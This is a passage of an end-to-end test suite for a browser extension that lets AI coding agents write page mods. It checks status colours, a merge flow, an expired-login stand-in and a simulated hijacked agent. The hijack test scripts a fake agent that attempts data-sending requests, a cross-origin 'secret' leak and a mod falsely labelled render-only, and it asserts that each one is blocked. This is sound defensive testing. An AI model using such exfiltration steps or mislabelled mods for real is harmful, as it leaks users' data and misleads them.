      const first = await this.waitLooks('the panel\'s status', (x) => !!x.dot && !/Checking/.test(x.dotLabel));
      const loggedOut = /isn’t logged in/.test(first.dotLabel);
      if (loggedOut) {
        await r.check('agent not logged in, on the site\'s page: the robot and power button turn yellow (mods stay green), the login notice shows', async () => {
          const x = await this.waitLooks('yellow', (l) => l.classes.join() === 'needs-login' && l.dot === 'dot warn');
          // Mods still run without a login, so their switches and lights stay green.
          const want = { rim: x.warn, power: x.warn, modSwitch: x.green };
          for (const [k, v] of Object.entries(want)) if (!Scenario.same(x[k], v)) throw new Error(`${k} is ${x[k]}, not ${v}: ${JSON.stringify(x)}`);
          if (x.light && !Scenario.same(x.light, x.green)) throw new Error(`the running light is ${x.light}`);
          if (!x.notices.some((t) => /isn’t logged in/.test(t))) throw new Error(`no login notice: ${x.notices}`);
          // F14: no sending into a run that can only fail with that; the button says why.
          if (!x.send.disabled || !/^Log in to .+ first$/.test(x.send.title)) throw new Error(`Send: ${JSON.stringify(x.send)}`);
          await this.shot(this.panelCtx, 'panel-yellow-site');
          return `"${x.dotLabel}"; ${x.warn}`;
        });
        await r.check('agent not logged in, on the gate: the small robot yellow, a line saying so, Fix still there', async () => {
          await this.goColour('gate');
          const x = await this.waitLooks('yellow gate', (l) => l.classes.join() === 'needs-login' && !!l.gateNote);
          if (!Scenario.same(x.gateRim, x.warn) || !x.fix || !x.dotShown || x.dot !== 'dot warn' || !/isn’t logged in/.test(x.gateNote)) throw new Error(JSON.stringify(x));
          await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
          await this.shot(this.panelCtx, 'panel-yellow-gate');
          return `"${x.gateNote}"`;
        });
        await r.check('agent not logged in, no website: the landing page as usual (no yellow there)', async () => {
          await this.goColour('landing');
          const x = await this.waitLooks('the landing page', (l) => !!l.landingIcon);
          if (x.classes.length || x.landingNote || x.dotShown || x.landingIcon !== 'icons/robot-shaded.svg') throw new Error(JSON.stringify(x));
          return 'green robot, no line, no dot';
        });
      } else r.note(`the agent is logged in here ("${first.dotLabel}"): no yellow checks`);

      // User scripts off: red, everything.
      const off = await r.check('user scripts off, on the site\'s page: everything red, "Mods are paused" first', async () => {
        this.scriptsRevoked = true; // the "user scripts were turned off" warnings are expected (consoleCheck, helperLogCheck)
        await this.d.revokeUserScripts(this.control);
        try {
          await waitFor('status.userScripts off', async () => (await this.cli(['status'], { json: true })).json?.extension?.userScripts === false, { timeoutMs: 20000 });
        } catch (e) {
          const probe = await this.ext(`async () => ({ api: typeof chrome.userScripts, granted: await chrome.permissions.contains({ permissions: ['userScripts'] }),
            getScripts: (() => { try { chrome.userScripts.getScripts().catch(() => {}); return 'no throw'; } catch (x) { return 'throws: ' + x.message; } })() })`).catch((x) => x.message);
          throw new Error(`${e.message}; on the setup page: ${JSON.stringify(probe)}`);
        }
        await this.goColour('site');
        const x = await this.waitLooks('red', (l) => l.problem === 'scripts' && l.classes.join() === 'blocked' && l.notices.length > 0);
        for (const k of ['rim', 'power', 'modSwitch']) if (!Scenario.same(x[k], x.bad)) throw new Error(`${k} is ${x[k]}, not ${x.bad}: ${JSON.stringify(x)}`);
        if (x.light && !Scenario.same(x.light, x.bad)) throw new Error(`the running light is ${x.light}`);
        if (x.dot !== 'dot bad') throw new Error(`dot ${x.dot}`);
        if (x.notices[0] !== 'Mods are paused') throw new Error(`notices: ${JSON.stringify(x.notices)}`);
        // F3: not logged in as well, both notices show, the paused one first.
        if (loggedOut && !x.notices.slice(1).some((t) => /isn’t logged in/.test(t))) throw new Error(`no login notice under it: ${JSON.stringify(x.notices)}`);
        // Still no sending while logged out, though the red problem holds the panel's main slot.
        if (loggedOut && (!x.send.disabled || !/^Log in to .+ first$/.test(x.send.title))) throw new Error(`Send: ${JSON.stringify(x.send)}`);
        await this.shot(this.panelCtx, loggedOut ? 'panel-scripts-off-logged-out' : 'panel-scripts-off');
        return x.notices.join(' / ');
      });
      if (off) {
        await r.check('user scripts off, on the gate: red robot, the line, no Fix button', async () => {
          await this.goColour('gate');
          const x = await this.waitLooks('red gate', (l) => l.problem === 'scripts' && !!l.gateNote);
          if (!Scenario.same(x.gateRim, x.bad) || x.fix || x.dot !== 'dot bad' || !x.dotShown || !/^Mods are paused/.test(x.gateNote)) throw new Error(JSON.stringify(x));
          await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
          await this.shot(this.panelCtx, 'panel-scripts-off-gate');
          return `"${x.gateNote}"`;
        });
        await r.check('user scripts off, no website: the red robot, the line, the dot', async () => {
          await this.goColour('landing');
          const x = await this.waitLooks('red landing', (l) => l.problem === 'scripts' && !!l.landingNote);
          if (x.landingIcon !== 'icons/robot-shaded-red.svg' || !x.landingIconLoaded || !x.dotShown || !/^Mods are paused/.test(x.landingNote)) throw new Error(JSON.stringify(x));
          await this.shot(this.panelCtx, 'panel-scripts-off-landing');
          return `"${x.landingNote}"`;
        });
      }
      await r.check('user scripts on again', async () => {
        const how = await this.d.grantUserScripts(this.control);
        await waitFor('status.userScripts', async () => (await this.cli(['status'], { json: true })).json?.extension?.userScripts, { timeoutMs: 20000 });
        return how;
      });

      // The helper not connected: its wrapper gone (as before setup), and the running helper stopped.
      const host = path.join(this.trif, 'bin', 'trif-host');
      const proc = pidsMatching('host.js').find((p) => p.pid === this.helperPid);
      if (!proc || !proc.command.includes(this.trif)) throw new Error(`the helper (pid ${this.helperPid}) isn't the scratch one: ${proc && proc.command}`);
      fs.renameSync(host, `${host}.off`);
      this.helperStopped = true; // its "helper disconnected" warnings are expected (consoleCheck)
      try {
        process.kill(this.helperPid, 'SIGTERM');
        await r.check('helper not connected, on the site\'s page: the robot and power button red, the mods (still running) green', async () => {
          await this.goColour('site');
          const x = await this.waitLooks('red, helper', (l) => l.problem === 'helper' && l.classes.join() === 'blocked' && l.notices.length > 0);
          if (!Scenario.same(x.rim, x.bad) || !Scenario.same(x.power, x.bad) || x.dot !== 'dot bad') throw new Error(JSON.stringify(x));
          if (!Scenario.same(x.modSwitch, x.green) || (x.light && !Scenario.same(x.light, x.green))) throw new Error(`the mods aren't green: ${JSON.stringify(x)}`);
          if (!x.notices.includes('The TRIF helper isn’t connected')) throw new Error(`notices: ${JSON.stringify(x.notices)}`);
          await this.shot(this.panelCtx, 'panel-helper-site');
          return `rim ${x.rim}, mods ${x.modSwitch}`;
        });
        await r.check('helper not connected, on the gate: red robot, the line, no Fix button', async () => {
          await this.goColour('gate');
          const x = await this.waitLooks('red gate, helper', (l) => l.problem === 'helper' && !!l.gateNote);
          if (!Scenario.same(x.gateRim, x.bad) || x.fix || !x.dotShown || !/^The TRIF helper isn’t connected\. Run npx timsrobot setup in a terminal, then restart \w+\. Setup page$/.test(x.gateNote)) throw new Error(JSON.stringify(x));
          await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
          await this.shot(this.panelCtx, 'panel-helper-gate');
          return `"${x.gateNote}"`;
        });
        await r.check('helper not connected, no website: the red robot, the line, the dot', async () => {
          await this.goColour('landing');
          const x = await this.waitLooks('red landing, helper', (l) => l.problem === 'helper' && !!l.landingNote);
          if (x.landingIcon !== 'icons/robot-shaded-red.svg' || !x.landingIconLoaded || !x.dotShown || x.dot !== 'dot bad') throw new Error(JSON.stringify(x));
          await this.waitBar('the landing page\'s bar', ['#dot', '#settings-btn']);
          await this.shot(this.panelCtx, 'panel-helper-landing');
          return `"${x.landingNote}"`;
        });
      } finally {
        fs.renameSync(`${host}.off`, host);
      }
      await r.check('helper back (Try again): the colours back to normal', async () => {
        await this.goColour('site');
        await this.waitLooks('the helper notice', (l) => l.notices.includes('The TRIF helper isn’t connected'));
        await this.d.click(this.panelCtx, '#notice .actions button');
        const st = await waitFor('the helper to answer `trif status`', async () => {
          const s = await this.cli(['status'], { json: true, timeoutMs: 15000 });
          return s.json && s.json.extension ? s.json : null;
        }, { timeoutMs: 30000 });
        this.helperPid = st.helper.pid;
        const p = pidsMatching('host.js').find((q) => q.pid === this.helperPid);
        if (!p || !p.command.includes(this.trif)) throw new Error(`the new helper (pid ${this.helperPid}) isn't the scratch one: ${p && p.command}`);
        const x = await this.waitLooks('no red', (l) => !l.classes.includes('blocked'));
        if (!Scenario.same(x.rim, (loggedOut ? x.warn : x.green))) throw new Error(JSON.stringify(x));
        return `helper pid ${this.helperPid}; ${x.classes.join() || 'green'}`;
      });
    } finally {
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [this.xTab, `https://x.com:${this.o.servers.tlsPort}/home`]).catch(() => {});
      await this.waitPanel('the panel back on x.com', (x) => x.site === 'x.com', 15000).catch(() => {});
      await this.narrow(false).catch(() => {});
    }
  }

  // ---- "Merge with my agent" on the edited shipped mod (upgrade scenarios, panel on x.com)

  async mergeChecks() {
    const r = this.r;
    const d = this.d;
    const chatKey = 'chat:x.com';
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [chatKey]);
    const file = path.join(this.trif, 'sites', 'x.com', 'punk-fonts.js');
    const pending = () => (JSON.parse(fs.readFileSync(path.join(this.trif, 'preinstalled.json'), 'utf8')).shipped || {})['x.com/punk-fonts'] || {};
    const before = fs.readFileSync(file, 'utf8');
    const model = this.o.claudeModel || 'haiku';
    if (this.o.agent) {
      // This site chat's own agent and model (the panel's Settings write the same).
      await this.ext(`async (model) => { const { sitePicks = {} } = await chrome.storage.local.get('sitePicks'); sitePicks['x.com'] = { agent: 'claude', models: { claude: model } }; await chrome.storage.local.set({ sitePicks }); }`, [model]);
    }
    if (!this.o.agent) {
      // Without your login the agent can't run, so the button waits for one (F14) and says why.
      await r.check('Merge with my agent: waits for a login, and says so', async () => {
        const b = await waitFor('the merge button', () => this.panel(`async () => {
          const m = document.querySelector('li[data-mod="x.com/punk-fonts"] .mod-update .merge');
          return m ? { disabled: m.disabled, title: m.title } : null;
        }`), { timeoutMs: 10000 });
        if (!b.disabled || !/^Log in to .+ first/.test(b.title)) throw new Error(JSON.stringify(b));
        await this.shot(this.panelCtx, 'panel-merge-needs-login');
        return `disabled: "${b.title}"`;
      });
      return;
    }
    await r.check('Merge with my agent: one click starts it, while the panel keeps refreshing', async () => {
      // Busy the panel the way real use does (status refreshes, storage changes) right before the click.
      await this.panel(`async () => { for (let i = 0; i < 5; i++) { await chrome.storage.local.set({ e2eTick: i }); document.dispatchEvent(new Event('visibilitychange')); } }`);
      await d.click(this.panelCtx, 'li[data-mod="x.com/punk-fonts"] .mod-update .merge');
      const c = await waitFor('the merge request in the chat', async () => {
        const x = await chat();
        return x && x.messages.some((m) => m.role === 'user' && /suggest how to merge/.test(m.text)) ? x : null;
      }, { timeoutMs: 5000, intervalMs: 200 });
      await this.shot(this.panelCtx, 'panel-merge-started');
      return `chat: "${c.messages.find((m) => m.role === 'user').text}"`;
    });
    const done = (n0) => waitFor('the run to finish', async () => {
      const x = await chat();
      return x && !x.run && x.messages.length > n0 ? x : null;
    }, { timeoutMs: 6 * 60000, intervalMs: 2000 });
    await r.check(`Merge (Claude Code, ${model}): the agent proposes and waits; nothing changes yet`, async () => {
      const c = await done(1);
      await this.shot(this.panelCtx, 'panel-merge-proposal');
      r.log(`merge proposal chat: ${JSON.stringify(c.messages, null, 2)}`);
      const said = c.messages.filter((m) => m.role === 'assistant').map((m) => m.text).join('\n');
      if (fs.readFileSync(file, 'utf8') !== before) throw new Error(`punk-fonts.js changed before the user said go ahead:\n${said.slice(-600)}`);
      if (!pending().pending) throw new Error('the update was settled by the proposal');
      if (!said.trim()) throw new Error(`no proposal in the chat: ${JSON.stringify(c.messages.slice(-3))}`);
      return said.replace(/\s+/g, ' ').slice(0, 300);
    });
    await r.check(`Merge (Claude Code, ${model}): "go ahead" merges it and settles the update`, async () => {
      const n0 = ((await chat()) || { messages: [] }).messages.length;
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, ['Go ahead.']);
      await d.click(this.panelCtx, '#send');
      const c = await done(n0 + 1);
      await this.shot(this.panelCtx, 'panel-merge-done');
      r.log(`merge go-ahead chat: ${JSON.stringify(c.messages.slice(n0), null, 2)}`);
      const now = fs.readFileSync(file, 'utf8');
      if (now === before) throw new Error('punk-fonts.js is unchanged');
      const v = /@version\s+(\S+)/.exec(now);
      const rec = await waitFor('the update to settle', async () => (pending().pending ? null : pending()), { timeoutMs: 10000 }).catch(() => null);
      if (!rec) throw new Error(`the update is still waiting (the copy says @version ${v && v[1]})`);
      const p = await this.waitPanel('the offer to go', (x) => x.mods.some((m) => m.id === 'x.com/punk-fonts' && !m.update), 15000);
      return `@version ${v && v[1]}; ${p ? 'the panel no longer offers it' : ''}`;
    });
  }

  // ---- an expired login, with a stand-in Claude Code (sidepanel.js loginLine, runs.js loginFailed)

  /**
   * A stand-in `claude` first on the helper's PATH (config.json env.PATH) that says it's logged in (as Claude
   * Code's `auth status` does with an expired login) and answers every run the way Claude Code 2.1.319 does
   * when its login can't be refreshed. It reaches nothing. Put back after.
   */
  async expiredLoginCheck(win) {
    const dir = path.join(this.work, 'standin');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
const a = process.argv.slice(2);
if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
const t = 'Failed to authenticate: OAuth session expired and could not be refreshed';
const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
say({ type: 'system', subtype: 'init', session_id: 'e2e-expired' });
say({ type: 'assistant', message: { model: '<synthetic>', content: [{ type: 'text', text: t }] }, error: 'authentication_failed' });
say({ type: 'result', subtype: 'success', is_error: true, result: t, session_id: 'e2e-expired' });
process.exitCode = 1;
`, { mode: 0o755 });
    const cfgFile = path.join(this.priv, 'config.json');
    const saved = fs.readFileSync(cfgFile, 'utf8');
    const cfg = JSON.parse(saved);
    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
    const site = '127.0.0.1';
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
    // The panel asks for the agents when it opens: open it again so it sees the stand-in.
    const reopen = async () => {
      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
      await sleep(800);
      this.panelCtx = await this.d.findPage('sidepanel.html');
    };
    try {
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
      // (The test window's own tab: x.com's is gone by now.)
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `http://${site}:${this.o.servers.port}/?e2e=expired`]);
      await reopen();
      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
      await this.waitLooks('Claude Code ready (the stand-in)', (l) => l.dotLabel === 'Ready · Claude Code' && !l.send.disabled, 30000);
      const message = 'hide the banner please';
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [message]);
      await this.d.click(this.panelCtx, '#send');
      const c = await waitFor('the run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 30000, intervalMs: 300 });
      const roles = c.messages.map((m) => [m.role, m.text]);
      if (JSON.stringify(roles) !== JSON.stringify([['user', message], ['login', 'Claude Code needs you to log in again.']])) throw new Error(`the chat: ${JSON.stringify(roles)}`);
      const x = await this.waitLooks('the login notice', (l) => l.classes.join() === 'needs-login' && l.notices.some((t) => /isn’t logged in/.test(t)), 20000);
      const shown = await waitFor('the message back in the box', () => this.panel(`async () => {
        const msgs = [...document.querySelectorAll('#messages > li')].map((li) => [li.className, li.innerText.trim()]);
        const input = document.getElementById('input').value;
        return input ? { msgs, input } : null;
      }`), { timeoutMs: 10000 });
      if (shown.input !== message) throw new Error(`the box has "${shown.input}"`);
      if (shown.msgs.some(([cls, text]) => /error|assistant/.test(cls) || /OAuth/.test(text))) throw new Error(`the chat shows: ${JSON.stringify(shown.msgs)}`);
      if (!shown.msgs.some(([cls, text]) => cls === 'msg login' && text === 'Claude Code needs you to log in again.')) throw new Error(`no login line: ${JSON.stringify(shown.msgs)}`);
      // Its own check still says logged in, so after logging in from a terminal, sending is how to tell.
      if (x.send.disabled) throw new Error(`Send is off: ${JSON.stringify(x.send)}`);
      await this.shot(this.panelCtx, 'panel-login-expired');
      // From a terminal: the plain message, and how to log in.
      const t = await this.cli(['agent', 'run', '--url', `http://${site}:${this.o.servers.port}/`, 'hi from a terminal'], { timeoutMs: 60000 });
      if (t.status !== 1 || !t.stderr.includes('error: Claude Code needs you to log in again. Run `trif agent login --agent claude`') || /OAuth/.test(t.stdout + t.stderr)) {
        throw new Error(`trif agent run: ${t.status} ${t.stderr} ${t.stdout}`);
      }
      return `"${x.notices.find((n) => /logged in/.test(n))}"; chat: ${roles.map((m) => m[0]).join(', ')}; the box: "${shown.input}"`;
    } finally {
      fs.writeFileSync(cfgFile, saved);
      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
    }
  }

  // ---- a hijacked agent, with a stand-in Claude Code (extension/tablock.js, helper/lib/powers.js and held.js)

  /**
   * A stand-in `claude` that does what an agent steered by a web page might: from `trif run` in the tab it
   * was given, a POST, a beacon, a WebSocket, a POST put off until after its command is over, and a
   * plain GET (reading is fine); then a mod whose header says render-only but whose code posts. The test
   * site must receive none of the writes, the GET must work, the panel must say the tab is locked, the mod
   * must be held for what its code does; a reload unlocks the tab, and a terminal's `trif run` (the
   * user's own) doesn't lock it.
   */
  async hijackedAgentCheck(win) {
    const dir = path.join(this.work, 'standin-hijack');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
const { spawnSync } = require('child_process');
const fs = require('fs');
const a = process.argv.slice(2);
if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
say({ type: 'system', subtype: 'init', session_id: 'e2e-hijack' });
process.on('uncaughtException', (e) => { const t = 'stand-in crashed: ' + (e && e.stack || e) + ' cwd=' + process.cwd(); say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text: JSON.stringify({ crash: t }) }] } }); say({ type: 'result', subtype: 'success', is_error: false, result: JSON.stringify({ crash: t }), session_id: 'e2e-hijack' }); process.exit(0); });
const ctxFile = a[a.indexOf('--append-system-prompt-file') + 1];
const ctx = a.includes('--append-system-prompt-file') ? fs.readFileSync(ctxFile, 'utf8') : a.join(' ');
const tab = (/\\(tab (\\d+)\\)/.exec(ctx) || [])[1];
const own = require('path').join(process.cwd(), 'bin', 'trif'); // (the workspace's, as the run's cwd is the workspace)
const trif = fs.existsSync(own) ? own : 'trif';
const run = (code) => {
  const r = spawnSync(trif, ['run', '--tab', tab, '--timeout', '8000', code], { encoding: 'utf8' });
  if (r.error) return 'trif failed: ' + r.error.message;
  if (r.status !== 0) return 'trif failed: ' + String(r.stderr || r.stdout || '').trim();
  try { return JSON.parse(r.stdout); } catch { return r.stdout.trim(); } // (a string result prints as it is)
};
const out = { tab };
out.post = run('fetch("/e2e-post", { method: "POST", body: "hi" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
out.get = run('fetch("/two.html").then((r) => r.status, (e) => "failed: " + e.message)');
out.leak = run('fetch("http://localhost:" + location.port + "/e2e-leak?d=secret").then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
out.beacon = run('navigator.sendBeacon("/e2e-beacon", "hi")');
out.socket = run('new Promise((res) => { const w = new WebSocket("ws://" + location.host + "/e2e-socket"); w.onopen = () => res("open"); w.onerror = () => res("blocked"); setTimeout(() => res("no answer"), 3000); })');
out.later = run('(setTimeout(() => fetch("/e2e-later", { method: "POST", body: "after the command" }), 1500), "put off")');
fs.writeFileSync('sites/127.0.0.1/e2e-poster.js', '// ==WebMod==\\n// @name Prettier\\n// @description Makes the page prettier\\n// @risk 0 render-only\\n// ==/WebMod==\\n(() => { fetch("/e2e-from-mod", { method: "POST" }); })();\\n');
const text = JSON.stringify(out);
say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text }] } });
say({ type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'e2e-hijack' });
`, { mode: 0o755 });
    const cfgFile = path.join(this.priv, 'config.json');
    const saved = fs.readFileSync(cfgFile, 'utf8');
    const cfg = JSON.parse(saved);
    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const posted = (p) => this.o.servers.requests.filter((q) => q.url.startsWith(p) && q.method !== 'GET');
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
    const reopen = async () => {
      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
      await sleep(800);
      this.panelCtx = await this.d.findPage('sidepanel.html');
    };
    const modFile = path.join(this.trif, 'sites', site, 'e2e-poster.js');
    this.hijacked = true; // (the console check expects the requests this blocks)
    try {
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=hijack`]);
      await reopen();
      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
      // (After the expired-login check the panel may still say Claude Code needs a login; Send works anyway.)
      await this.waitLooks('Send on (the stand-in Claude Code)', (l) => /Claude Code/.test(l.dotLabel) && !l.send.disabled, 30000);
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, ['make the page prettier']);
      await this.d.click(this.panelCtx, '#send');
      const c = await waitFor('the run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 60000, intervalMs: 300 });
      const answer = c.messages.find((m) => m.role === 'assistant');
      if (!answer) throw new Error(`the run: ${JSON.stringify(c.messages.map((m) => [m.role, String(m.text).slice(0, 400)]))}`);
      const said = JSON.parse(answer.text);
      if (said.crash) throw new Error(said.crash);
      if (String(said.tab) !== String(win.tabId)) throw new Error(`the stand-in got tab ${said.tab}, not ${win.tabId}: ${JSON.stringify(said)}`);
      if (!/^blocked/.test(said.post)) throw new Error(`the POST: ${said.post}`);
      if (said.get !== 200) throw new Error(`a GET should still work: ${said.get}`);
      if (!/^blocked/.test(said.leak)) throw new Error(`the GET to another site: ${said.leak}`);
      if (said.socket === 'open') throw new Error('the WebSocket opened');
      if (said.later !== 'put off') throw new Error(`the put-off POST: ${said.later}`);
      await sleep(3000); // (past the put-off POST's 1.5 s)
      for (const p of ['/e2e-post', '/e2e-beacon', '/e2e-later', '/e2e-from-mod']) if (posted(p).length) throw new Error(`the test site received ${JSON.stringify(posted(p))}`);
      const leaked = () => this.o.servers.requests.filter((q) => /^\/e2e-(leak|nav)/.test(q.url));
      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
      if (this.o.servers.requests.some((q) => q.url.startsWith('/e2e-socket'))) throw new Error('the WebSocket reached the test site');
      // The panel says so, with a Reload button
      const lock = await waitFor('the lock notice', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? n.innerText : null; }`), { timeoutMs: 10000 });
      if (!/Posting is paused on this tab/.test(lock)) throw new Error(`the lock notice: ${lock}`);
      // The mod: held for what its code does, its header's claim shown apart
      const held = await waitFor('the mod held', () => this.panel(`async () => {
        const li = document.querySelector('#mod-list li[data-mod="${site}/e2e-poster"]');
        const box = li && li.querySelector('.mod-facts.held');
        return box ? { facts: [...box.querySelectorAll('ul.facts li')].map((x) => x.textContent), claim: box.querySelector('.facts-claim')?.textContent || '' } : null;
      }`), { timeoutMs: 15000 });
      if (!held.facts.some((f) => /send requests or messages from the page as you \(it uses fetch\)/.test(f))) throw new Error(`the held facts: ${JSON.stringify(held)}`);
      if (!/The agent says: .render-only/.test(held.claim)) throw new Error(`the claim: ${held.claim}`);
      await this.shot(this.panelCtx, 'panel-hijack-held-and-locked');
      // Code left in the locked page sending the tab to another site with what it read: blocked (the
      // tab shows the browser's blocked page); the panel's button takes it back to the page it was
      // locked on, a new page: unlocked
      const away = await this.cli(['run', '--tab', String(win.tabId), '(setTimeout(() => { location.href = "http://localhost:" + location.port + "/e2e-nav?d=secret"; }, 100), "sending it away")'], { timeoutMs: 30000 });
      if (away.status !== 0) throw new Error(`trif run: ${away.stderr}`);
      await sleep(2500);
      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
      await waitFor('the lock notice still up', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden || null; }`), { timeoutMs: 10000 });
      await this.panel(`async () => { document.querySelector('#tab-lock button').click(); return true; }`);
      await waitFor('the tab back on the test site', async () => {
        const t = await this.ext(`async (id) => (await chrome.tabs.get(id)).url`, [win.tabId]);
        return t && t.startsWith(base) ? t : null;
      }, { timeoutMs: 15000 });
      await waitFor('the tab unlocked', () => this.panel(`async () => document.getElementById('tab-lock').hidden || null`), { timeoutMs: 15000 });
      const t = await this.cli(['run', '--tab', String(win.tabId), 'fetch("/e2e-after", { method: "POST", body: "x" }).then((r) => r.status)'], { timeoutMs: 30000 });
      if (t.status !== 0) throw new Error(`trif run from a terminal: ${t.stderr}`);
      await waitFor('the terminal POST to arrive', () => posted('/e2e-after').length || null, { timeoutMs: 5000 });
      if (!(await this.panel(`async () => document.getElementById('tab-lock').hidden`))) throw new Error('a terminal trif run locked the tab');
      // A mod from outside any run (pasted into the folder, as a shared mod would be) that posts: held
      // too, until the user's `trif approve`; then it runs
      const pasted = path.join(this.trif, 'sites', site, 'e2e-pasted.js');
      fs.writeFileSync(pasted, '// ==WebMod==\n// @name Pasted\n// @risk 0 render-only\n// ==/WebMod==\n(() => { document.documentElement.dataset.e2ePasted = "ran"; fetch("/e2e-pasted", { method: "POST" }); })();\n');
      const pastedHeld = await waitFor('the pasted mod held', async () => {
        const st = await this.cli(['status'], { timeoutMs: 20000 });
        return /127\.0\.0\.1\/e2e-pasted\s+HELD: it can send requests/.test(st.stdout) ? st.stdout.split('\n').find((l) => l.includes('e2e-pasted')).trim() : null;
      }, { timeoutMs: 15000, intervalMs: 500 });
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      const ranHeld = await this.cli(['run', '--tab', String(win.tabId), 'document.documentElement.dataset.e2ePasted || "not run"'], { timeoutMs: 20000 });
      if (ranHeld.stdout.trim() !== 'not run' || posted('/e2e-pasted').length) throw new Error(`the held mod ran: ${ranHeld.stdout}`);
      const ok = await this.cli(['approve', `${site}/e2e-pasted`], { timeoutMs: 20000 });
      if (ok.status !== 0) throw new Error(`trif approve: ${ok.stderr}`);
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      await waitFor('the approved mod to run', async () => {
        const r2 = await this.cli(['run', '--tab', String(win.tabId), 'document.documentElement.dataset.e2ePasted || "not run"'], { timeoutMs: 20000 });
        return r2.stdout.trim() === 'ran' || null;
      }, { timeoutMs: 15000, intervalMs: 500 });
      await waitFor('its POST to arrive', () => posted('/e2e-pasted').length || null, { timeoutMs: 5000 });
      fs.unlinkSync(pasted);
      return `POST ${said.post}; GET ${said.get}; GET to another site ${said.leak}; beacon/later/socket/leaving for another site never arrived; mod held: ${held.facts.join(' / ')}; the panel's button brought the tab back, unlocked; a pasted mod that posts: "${pastedHeld}", ran once approved`;
    } finally {
      fs.writeFileSync(cfgFile, saved);
      for (const f of [modFile, path.join(this.trif, 'sites', site, 'e2e-pasted.js')]) { try { fs.unlinkSync(f); } catch { /* not written */ } }
      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
    }
  }

  // ---- agent runs (real ones: they use your Claude Code / Codex login and cost a little)

  async agentChecks(agent) {
    const r = this.r;
    const d = this.d;
    const { port } = this.o.servers;
    const base = `http://127.0.0.1:${port}`;
    const sitesDir = path.join(this.trif, 'sites', '127.0.0.1');
    const tccStart = new Date();
    // 'oss': the open-model agent (codex-oss) through OpenRouter, with the key the user saved in the Keychain.
    const agentId = agent === 'oss' ? 'codex-oss' : agent;
    const name = agent === 'claude' ? 'Claude Code' : agent === 'oss' ? 'Open model (OpenRouter)' : 'Codex';
    const model = agent === 'claude' ? (this.o.claudeModel || 'haiku') : agent === 'oss' ? (this.o.ossModel || 'qwen/qwen3-coder') : this.o.codexModel;
    if (agent === 'oss') {
      const set = await this.cli(['agent', 'open-model', '--provider', 'openrouter', '--model', model]);
      if (set.status !== 0) { r.record(`${name}: set up the open model`, 'fail', `${set.stdout}${set.stderr}`); return; }
      // The key: the Keychain item the user saved (the helper runs with the real HOME for agent runs, so it
      // finds the login Keychain; asked here the same way). Only whether there is one: never the key.
      const st = await this.cli(['agent', 'open-model'], { json: true, env: { HOME: REAL_HOME, TRIF_HOME: this.trif, TRIF_PRIVATE: this.priv } });
      if (!st.json || !st.json.hasKey) {
        r.record(`${name}: an OpenRouter key in the Keychain`, 'skip', (st.json && st.json.key && st.json.key.error)
